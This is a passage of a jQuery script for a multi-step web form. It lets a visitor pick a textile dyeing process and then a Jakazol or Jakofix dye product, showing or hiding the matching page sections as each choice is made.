
// When the DOM is ready...
$(function(){
	
	// Hide stuff with the JavaScript. If JS is disabled, the form will still be useable.
	// NOTE:
	// Sometimes using the .hide(); function isn't as ideal as it uses display: none; 
	// which has problems with some screen readers. Applying a CSS class to kick it off the
	// screen is usually prefered, but since we will be UNhiding these as well, this works.
	$("#step_2 input[type=radio]").each(function(){
		this.checked = false;
	});
	
	// Fade out steps 2 and 3 until ready
	$("#step_2").css({ opacity: 0.3 });
	$("#step_3").css({ opacity: 0.3 });
	
	$.stepTwoComplete_one = "not complete";
	$.stepTwoComplete_two = "not complete"; 
		
	// When a dropdown selection is made
	
	$("input[name=process]").click(function(){
		var all_complete = false;
				
		$("#step_1 input[type=radio]").each(function(){
			if (this.checked == true ) {
				all_complete = true;
				document.getElementById('default-step2').style.display = 'none';
				var val = $(this).val();
				if(val == 'cold') {
					document.getElementById('cold').style.display = '';
					document.getElementById('dry').style.display = 'none';
					document.getElementById('warm').style.display = 'none';
					
					$("#cold input[type=radio]").each(function(){
							this.checked = false; 
					});
					$("#dry input[type=radio]").each(function(){
							this.checked = false; 
					});
					$("#warm input[type=radio]").each(function(){
							this.checked = false; 
					});
				}
				if(val == 'warm') {
					document.getElementById('cold').style.display = 'none';
					document.getElementById('dry').style.display = 'none';
					document.getElementById('warm').style.display = '';
					
					$("#cold input[type=radio]").each(function(){
							this.checked = false; 
					});
					$("#dry input[type=radio]").each(function(){
							this.checked = false; 
					});
					$("#warm input[type=radio]").each(function(){
							this.checked = false; 
					});
				}
				if(val == 'dry') {
					document.getElementById('cold').style.display = 'none';
					document.getElementById('dry').style.display = '';
					document.getElementById('warm').style.display = 'none';
					
					$("#cold input[type=radio]").each(function(){
							this.checked = false; 
					});
					$("#dry input[type=radio]").each(function(){
							this.checked = false; 
					});
					$("#warm input[type=radio]").each(function(){
							this.checked = false; 
					});
				}
				//if(document.getElementById('default-step3').style.display == 'none') 
				{
					
					/*$("#step_3")
						.animate({
							paddingBottom: "15px"
						})
						.css({
							"background-image": ""
						});

					$("#step_3").css({
									opacity: 0.3
								});*/
					if (all_complete) {
						$("#step_1")
						.animate({
							paddingBottom: "120px"
						})
						.css({
							"background-image": "url(img/check.png)",
							"background-position": "bottom center",
							"background-repeat": "no-repeat"
						});
						
						$("#step_3").css({
							opacity: 1.0
						});
						$("#step_3 legend").css({
							opacity: 1.0 // For dumb Internet Explorer
						});
					}

				}
				
			}
			
		});
		
		
	});
	
	
	function stepTwoTest(val) {
		if (($.stepTwoComplete_one == "complete")) {
			
			document.getElementById('default-step3').style.display = 'none';
			$("#step_2")
			.animate({
				paddingBottom: "120px"
			})
			.css({
				"background-image": "url(img/check.png)",
				"background-position": "bottom center",
				"background-repeat": "no-repeat"
			});
			$("#step_3").css({
				opacity: 2.0
			});
			$("#step_3 legend").css({
				opacity: 2.0 // For dumb Internet Explorer
			});
			if(val == 'warm-jakazol-ld')
			{
				document.getElementById('warm-exhaust-dyeing-jakazol-ld').style.display = '';
				document.getElementById('warm-exhaust-dyeing-jakazol-hlf').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-ce').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-ds').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-vs').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-me').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-wlt').style.display = 'none';
			}
			if(val == 'warm-jakazol-hlf')
			{
				document.getElementById('warm-exhaust-dyeing-jakazol-ld').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-hlf').style.display = '';
				document.getElementById('warm-exhaust-dyeing-jakazol-ce').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-ds').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-vs').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-me').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-wlt').style.display = 'none';
			}
			if(val == 'warm-jakazol-ce')
			{
				document.getElementById('warm-exhaust-dyeing-jakazol-ld').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-hlf').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-ce').style.display = '';
				document.getElementById('warm-exhaust-dyeing-jakazol-ds').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-vs').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-me').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-wlt').style.display = 'none';
			}
			if(val == 'warm-jakazol-ds')
			{
				document.getElementById('warm-exhaust-dyeing-jakazol-ld').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-hlf').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-ce').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-ds').style.display = '';
				document.getElementById('warm-exhaust-dyeing-jakazol-vs').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-me').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-wlt').style.display = 'none';
			}
			if(val == 'warm-jakazol-vs')
			{
				document.getElementById('warm-exhaust-dyeing-jakazol-ld').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-hlf').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-ce').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-ds').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-vs').style.display = '';
				document.getElementById('warm-exhaust-dyeing-jakazol-me').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-wlt').style.display = 'none';
			}
			if(val == 'warm-jakofix-me')
			{
				document.getElementById('warm-exhaust-dyeing-jakazol-ld').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-hlf').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-ce').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-ds').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-vs').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-me').style.display = '';
				document.getElementById('warm-exhaust-dyeing-jakazol-wlt').style.display = 'none';
			}
			if(val == 'warm-jakazol-wlt')
			{
				document.getElementById('warm-exhaust-dyeing-jakazol-ld').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-hlf').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-ce').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-ds').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-vs').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-me').style.display = 'none';
				document.getElementById('warm-exhaust-dyeing-jakazol-wlt').style.display = '';
			}
			if(val == 'cold-jakazol-ld')
			{
				document.getElementById('cold-pad-batch-dyeing-jakazol-ld').style.display = '';
				document.getElementById('cold-pad-batch-dyeing-jakazol-hlf').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-ce').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-ds').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-vs').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakofix-me').style.display = 'none';
				
			}
			if(val == 'cold-jakazol-hlf')
			{
				document.getElementById('cold-pad-batch-dyeing-jakazol-ld').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-hlf').style.display = '';
				document.getElementById('cold-pad-batch-dyeing-jakazol-ce').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-ds').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-vs').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakofix-me').style.display = 'none';
				
			}
			if(val == 'cold-jakazol-ce')
			{
				document.getElementById('cold-pad-batch-dyeing-jakazol-ld').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-hlf').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-ce').style.display = '';
				document.getElementById('cold-pad-batch-dyeing-jakazol-ds').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-vs').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakofix-me').style.display = 'none';
				
			}
			if(val == 'cold-jakazol-ds')
			{
				document.getElementById('cold-pad-batch-dyeing-jakazol-ld').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-hlf').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-ce').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-ds').style.display = '';
				document.getElementById('cold-pad-batch-dyeing-jakazol-vs').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakofix-me').style.display = 'none';
				
			}
			if(val == 'cold-jakazol-vs')
			{
				document.getElementById('cold-pad-batch-dyeing-jakazol-ld').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-hlf').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-ce').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-ds').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-vs').style.display = '';
				document.getElementById('cold-pad-batch-dyeing-jakofix-me').style.display = 'none';
				
			}
			if(val == 'cold-jakofix-me')
			{
				document.getElementById('cold-pad-batch-dyeing-jakazol-ld').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-hlf').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-ce').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-ds').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakazol-vs').style.display = 'none';
				document.getElementById('cold-pad-batch-dyeing-jakofix-me').style.display = '';
				
			}
			if(val == 'chemicalpad-steam-jakazol-hlf')
			{
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-vs').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ds').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ce').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ld').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-p').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-hlf').style.display = '';
				
			}
			if(val == 'chemicalpad-steam-jakofix-p')
			{
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-vs').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ds').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ce').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ld').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-p').style.display = '';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-hlf').style.display = 'none';
				
			}
			if(val == 'chemicalpad-steam-jakazol-ld')
			{
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-vs').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ds').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ce').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ld').style.display = '';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-p').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-hlf').style.display = 'none';
				
			}
			if(val == 'chemicalpad-steam-jakazol-ce')
			{
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-vs').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ds').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ce').style.display = '';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ld').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-p').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-hlf').style.display = 'none';
				
			}
			if(val == 'chemicalpad-steam-jakazol-ds')
			{
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-vs').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ds').style.display = '';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ce').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ld').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-p').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-hlf').style.display = 'none';
				
			}
			if(val == 'chemicalpad-steam-jakazol-vs')
			{
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-vs').style.display = '';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ds').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ce').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-ld').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-p').style.display = 'none';
				document.getElementById('pad-dry-chemical-pad-steam-jakazol-hlf').style.display = 'none';
				
			}
			
			if(val == 'pad-dry-steam-jakofix-p')
			{
				document.getElementById('pad-dry-steam-jakofix-p').style.display = '';
				document.getElementById('pad-dry-steam-jakazol-ld').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-ce').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-ds').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-vs').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-hlf').style.display = 'none';
				
			}
			if(val == 'pad-dry-steam-jakazol-ld')
			{
				document.getElementById('pad-dry-steam-jakofix-p').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-ld').style.display = '';
				document.getElementById('pad-dry-steam-jakazol-ce').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-ds').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-vs').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-hlf').style.display = 'none';
				
			}
			if(val == 'pad-dry-steam-jakazol-ce')
			{
				document.getElementById('pad-dry-steam-jakofix-p').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-ld').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-ce').style.display = '';
				document.getElementById('pad-dry-steam-jakazol-ds').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-vs').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-hlf').style.display = 'none';
				
			}
			if(val == 'pad-dry-steam-jakazol-ds')
			{
				document.getElementById('pad-dry-steam-jakofix-p').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-ld').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-ce').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-ds').style.display = '';
				document.getElementById('pad-dry-steam-jakazol-vs').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-hlf').style.display = 'none';
				
			}
			if(val == 'pad-dry-steam-jakazol-vs')
			{
				document.getElementById('pad-dry-steam-jakofix-p').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-ld').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-ce').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-ds').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-vs').style.display = '';
				document.getElementById('pad-dry-steam-jakazol-hlf').style.display = 'none';
				
			}
			if(val == 'pad-dry-steam-jakazol-hlf')
			{
				document.getElementById('pad-dry-steam-jakofix-p').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-ld').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-ce').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-ds').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-vs').style.display = 'none';
				document.getElementById('pad-dry-steam-jakazol-hlf').style.display = '';
				
			}
			
			if(val == 'dry-thermofix-jakofix-p')
			{
				document.getElementById('pad-dry-thermofix-jakofix-p').style.display = '';
				document.getElementById('pad-dry-thermofix-jakazol-ce').style.display = 'none';
				document.getElementById('pad-dry-thermofix-jakazol-ds').style.display = 'none';
				document.getElementById('pad-dry-thermofix-jakazol-vs').style.display = 'none';
				document.getElementById('pad-dry-thermofix-jakazol-hlf').style.display = 'none';
				
			}
			if(val == 'dry-thermofix-jakazol-ce')
			{
				document.getElementById('pad-dry-thermofix-jakofix-p').style.display = 'none';
				document.getElementById('pad-dry-thermofix-jakazol-ce').style.display = '';
				document.getElementById('pad-dry-thermofix-jakazol-ds').style.display = 'none';
				document.getElementById('pad-dry-thermofix-jakazol-vs').style.display = 'none';
				document.getElementById('pad-dry-thermofix-jakazol-hlf').style.display = 'none';
				
			}
			if(val == 'dry-thermofix-jakazol-ds')
			{
				document.getElementById('pad-dry-thermofix-jakofix-p').style.display = 'none';
				document.getElementById('pad-dry-thermofix-jakazol-ce').style.display = 'none';
				document.getElementById('pad-dry-thermofix-jakazol-ds').style.display = '';
				document.getElementById('pad-dry-thermofix-jakazol-vs').style.display = 'none';
				document.getElementById('pad-dry-thermofix-jakazol-hlf').style.display = 'none';
				
			}
			if(val == 'dry-thermofix-jakazol-vs')
			{
				document.getElementById('pad-dry-thermofix-jakofix-p').style.display = 'none';
				document.getElementById('pad-dry-thermofix-jakazol-ce').style.display = 'none';
				document.getElementById('pad-dry-thermofix-jakazol-ds').style.display = 'none';
				document.getElementById('pad-dry-thermofix-jakazol-vs').style.display = '';
				document.getElementById('pad-dry-thermofix-jakazol-hlf').style.display = 'none';
				
			}
			if(val == 'dry-thermofix-jakazol-hlf')
			{
				document.getElementById('pad-dry-thermofix-jakofix-p').style.display = 'none';
				document.getElementById('pad-dry-thermofix-jakazol-ce').style.display = 'none';
				document.getElementById('pad-dry-thermofix-jakazol-ds').style.display = 'none';
				document.getElementById('pad-dry-thermofix-jakazol-vs').style.display = 'none';
				document.getElementById('pad-dry-thermofix-jakazol-hlf').style.display = '';
				
			}
			if(val == 'econtrol-jakofix-p')
			{
				document.getElementById('econtrol-method-jakofix-c').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ds').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-hlf').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-vs').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ce').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ld').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ld').style.display = 'none';
				document.getElementById('econtrol-method-jakofix-p').style.display = '';
				
			}
			if(val == 'econtrol-jakazol-ld')
			{
				document.getElementById('econtrol-method-jakofix-c').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ds').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-hlf').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-vs').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ce').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ld').style.display = '';
				document.getElementById('econtrol-method-jakofix-p').style.display = 'none';
				
			}
			if(val == 'econtrol-jakazol-ce')
			{
				document.getElementById('econtrol-method-jakofix-c').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ds').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-hlf').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-vs').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ce').style.display = '';
				document.getElementById('econtrol-method-jakazol-ld').style.display = 'none';
				document.getElementById('econtrol-method-jakofix-p').style.display = 'none';
				
			}
			if(val == 'econtrol-jakazol-vs')
			{
				document.getElementById('econtrol-method-jakofix-c').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ds').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-hlf').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-vs').style.display = '';
				document.getElementById('econtrol-method-jakazol-ce').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ld').style.display = 'none';
				document.getElementById('econtrol-method-jakofix-p').style.display = 'none';
				
			}
			if(val == 'econtrol-jakazol-hlf')
			{
				document.getElementById('econtrol-method-jakofix-c').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ds').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-hlf').style.display = '';
				document.getElementById('econtrol-method-jakazol-vs').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ce').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ld').style.display = 'none';
				document.getElementById('econtrol-method-jakofix-p').style.display = 'none';
				
			}
			if(val == 'econtrol-jakazol-ds')
			{
				document.getElementById('econtrol-method-jakofix-c').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ds').style.display = '';
				document.getElementById('econtrol-method-jakazol-hlf').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-vs').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ce').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ld').style.display = 'none';
				document.getElementById('econtrol-method-jakofix-p').style.display = 'none';
				
			}
			
			if(val == 'econtrol-jakofix-c')
			{
				document.getElementById('econtrol-method-jakofix-c').style.display = '';
				document.getElementById('econtrol-method-jakazol-ds').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-hlf').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-vs').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ce').style.display = 'none';
				document.getElementById('econtrol-method-jakazol-ld').style.display = 'none';
				document.getElementById('econtrol-method-jakofix-p').style.display = 'none';
				
			}
			
			if(val == 'printing-jakofix-p') {
				document.getElementById('printing-method-jakofix-p').style.display = '';
				document.getElementById('printing-method-jakazol-commodity-vs').style.display = 'none';
			}
			if(val == 'printing-jakazol–commodity-vs') {
				document.getElementById('printing-method-jakazol-commodity-vs').style.display = '';
				document.getElementById('printing-method-jakofix-p').style.display = 'none';
			}

			if(val == 'hot-exhaust-jakofix-supra-hr')
			{
				document.getElementById('hot-exhaust-dyeing-jakofix-supra-hr').style.display = '';
				document.getElementById('hot-exhaust-dyeing-jakofix-he').style.display = 'none';
			}
			if(val == 'hot-exhaust-jakofix-he')
			{
				document.getElementById('hot-exhaust-dyeing-jakofix-supra-hr').style.display = 'none';
				document.getElementById('hot-exhaust-dyeing-jakofix-he').style.display = '';
			}
			
			if(val == 'padstream-jakofix-me')
			{
				document.getElementById('pad-steam-jakazol-vs').style.display = 'none';
				document.getElementById('pad-steam-jakofix-me').style.display = '';
			}
			if(val == 'padstream-jakazol-vs')
			{
				document.getElementById('pad-steam-jakofix-me').style.display = 'none';
				document.getElementById('pad-steam-jakazol-vs').style.display = '';
			}
			if(val == 'cold-exhaust-dyeing-jakofix-c')
			{
				document.getElementById('cold-exhaust-dyeing-jakofix-c-process').style.display = '';
			}
			
			
		}
	};
$("input[name=warm-product]").click(function(){	
var val = '';
	$("#step_2 input[type=radio]").each(function(){
			if (this.checked == true ) {
				$.stepTwoComplete_one = "complete"; 
				val = $(this).val();
			}
	document.getElementById('product-warm-exhaust-dyeing').style.display = '';
	document.getElementById('product-cold-pad-batch-dyeing').style.display = 'none';
			document.getElementById('product-pad-dry-chemical-pad-stream').style.display = 'none';
		document.getElementById('pad-dry-stream').style.display = 'none';
		document.getElementById('products-pad-dry-thermofix').style.display = 'none';
		document.getElementById('econtrol-product-list').style.display = 'none';
		document.getElementById('printing-method-product').style.display = 'none';
		document.getElementById('pad-stream').style.display = 'none';
		document.getElementById('hot-exhaust-dyeing-product').style.display = 'none';
		document.getElementById('cold-exhaust-dyeing-process').style.display = 'none';

	
	});
	stepTwoTest(val);
	});
$("input[name=cold-product]").click(function(){	
var val = '';
	$("#step_2 input[type=radio]").each(function(){
			if (this.checked == true ) {
				$.stepTwoComplete_one = "complete"; 
				val = $(this).val();
			}
		document.getElementById('product-warm-exhaust-dyeing').style.display = 'none';
		document.getElementById('product-cold-pad-batch-dyeing').style.display = '';
		document.getElementById('product-pad-dry-chemical-pad-stream').style.display = 'none';
		document.getElementById('pad-dry-stream').style.display = 'none';
		document.getElementById('products-pad-dry-thermofix').style.display = 'none';
		document.getElementById('econtrol-product-list').style.display = 'none';
		document.getElementById('printing-method-product').style.display = 'none';
		document.getElementById('pad-stream').style.display = 'none';
		document.getElementById('hot-exhaust-dyeing-product').style.display = 'none';
		document.getElementById('cold-exhaust-dyeing-process').style.display = 'none';
		

	});
	stepTwoTest(val);
	});
$("input[name=chemicalpad-steam-product]").click(function(){	
var val = '';
	$("#step_2 input[type=radio]").each(function(){
			if (this.checked == true ) {
				$.stepTwoComplete_one = "complete"; 
				
				val = $(this).val();
			}
		document.getElementById('product-warm-exhaust-dyeing').style.display = 'none';
		document.getElementById('product-cold-pad-batch-dyeing').style.display = 'none';
		document.getElementById('product-pad-dry-chemical-pad-stream').style.display = '';
		document.getElementById('pad-dry-stream').style.display = 'none';
		document.getElementById('products-pad-dry-thermofix').style.display = 'none';
		document.getElementById('econtrol-product-list').style.display = 'none';
		document.getElementById('printing-method-product').style.display = 'none';
		document.getElementById('pad-stream').style.display = 'none';
		document.getElementById('hot-exhaust-dyeing-product').style.display = 'none';
		document.getElementById('cold-exhaust-dyeing-process').style.display = 'none';

	});
	stepTwoTest(val);
	});	
	$("input[name=pad-dry-steam-product]").click(function(){	
var val = '';
	$("#step_2 input[type=radio]").each(function(){
			if (this.checked == true ) {
				$.stepTwoComplete_one = "complete"; 
				val = $(this).val();
			}
		document.getElementById('product-warm-exhaust-dyeing').style.display = 'none';
		document.getElementById('product-cold-pad-batch-dyeing').style.display = 'none';
		document.getElementById('product-pad-dry-chemical-pad-stream').style.display = 'none';
		document.getElementById('pad-dry-stream').style.display = '';
		document.getElementById('products-pad-dry-thermofix').style.display = 'none';
		document.getElementById('econtrol-product-list').style.display = 'none';
		document.getElementById('printing-method-product').style.display = 'none';
		document.getElementById('pad-stream').style.display = 'none';
		document.getElementById('hot-exhaust-dyeing-product').style.display = 'none';
		document.getElementById('cold-exhaust-dyeing-process').style.display = 'none';

	});
	stepTwoTest(val);
	});
	
	$("input[name=dry-thermofix-product]").click(function(){	
var val = '';
	$("#step_2 input[type=radio]").each(function(){
			if (this.checked == true ) {
				$.stepTwoComplete_one = "complete"; 
				val = $(this).val();
			}
		document.getElementById('product-warm-exhaust-dyeing').style.display = 'none';
		document.getElementById('product-cold-pad-batch-dyeing').style.display = 'none';
		document.getElementById('product-pad-dry-chemical-pad-stream').style.display = 'none';
		document.getElementById('pad-dry-stream').style.display = 'none';
		document.getElementById('products-pad-dry-thermofix').style.display = '';
		document.getElementById('econtrol-product-list').style.display = 'none';
		document.getElementById('printing-method-product').style.display = 'none';
		document.getElementById('pad-stream').style.display = 'none';
		document.getElementById('hot-exhaust-dyeing-product').style.display = 'none';
		document.getElementById('cold-exhaust-dyeing-process').style.display = 'none';

	});
	stepTwoTest(val);
	});
	
	$("input[name=econtrol-product]").click(function(){	
var val = '';
	$("#step_2 input[type=radio]").each(function(){
			if (this.checked == true ) {
				$.stepTwoComplete_one = "complete"; 
				val = $(this).val();
			}
		document.getElementById('product-warm-exhaust-dyeing').style.display = 'none';
		document.getElementById('product-cold-pad-batch-dyeing').style.display = 'none';
		document.getElementById('product-pad-dry-chemical-pad-stream').style.display = 'none';
		document.getElementById('pad-dry-stream').style.display = 'none';
		document.getElementById('products-pad-dry-thermofix').style.display = 'none';
		document.getElementById('econtrol-product-list').style.display = '';
		document.getElementById('printing-method-product').style.display = 'none';
		document.getElementById('pad-stream').style.display = 'none';
		document.getElementById('hot-exhaust-dyeing-product').style.display = 'none';
		document.getElementById('cold-exhaust-dyeing-process').style.display = 'none';

	});
	stepTwoTest(val);
	});
	
	
	$("input[name=printing-product]").click(function(){	
var val = '';
	$("#step_2 input[type=radio]").each(function(){
			if (this.checked == true ) {
				$.stepTwoComplete_one = "complete"; 
				val = $(this).val();
			}
		document.getElementById('product-warm-exhaust-dyeing').style.display = 'none';
		document.getElementById('product-cold-pad-batch-dyeing').style.display = 'none';
		document.getElementById('product-pad-dry-chemical-pad-stream').style.display = 'none';
		document.getElementById('pad-dry-stream').style.display = 'none';
		document.getElementById('products-pad-dry-thermofix').style.display = 'none';
		document.getElementById('econtrol-product-list').style.display = 'none';
		document.getElementById('printing-method-product').style.display = '';
		document.getElementById('pad-stream').style.display = 'none';
		document.getElementById('hot-exhaust-dyeing-product').style.display = 'none';
		document.getElementById('cold-exhaust-dyeing-process').style.display = 'none';

	});
	stepTwoTest(val);
	});
	
	$("input[name=hot-exhaust-product]").click(function(){	
var val = '';
	$("#step_2 input[type=radio]").each(function(){
			if (this.checked == true ) {
				$.stepTwoComplete_one = "complete"; 
				val = $(this).val();
			}
		document.getElementById('product-warm-exhaust-dyeing').style.display = 'none';
		document.getElementById('product-cold-pad-batch-dyeing').style.display = 'none';
		document.getElementById('product-pad-dry-chemical-pad-stream').style.display = 'none';
		document.getElementById('pad-dry-stream').style.display = 'none';
		document.getElementById('products-pad-dry-thermofix').style.display = 'none';
		document.getElementById('econtrol-product-list').style.display = 'none';
		document.getElementById('printing-method-product').style.display = 'none';
		document.getElementById('hot-exhaust-dyeing-product').style.display = '';
		document.getElementById('pad-stream').style.display = 'none';
		document.getElementById('cold-exhaust-dyeing-process').style.display = 'none';
	});
	stepTwoTest(val);
	});
	
	$("input[name=padstream-product]").click(function(){	
var val = '';
	$("#step_2 input[type=radio]").each(function(){
			if (this.checked == true ) {
				$.stepTwoComplete_one = "complete"; 
				val = $(this).val();
			}
		document.getElementById('product-warm-exhaust-dyeing').style.display = 'none';
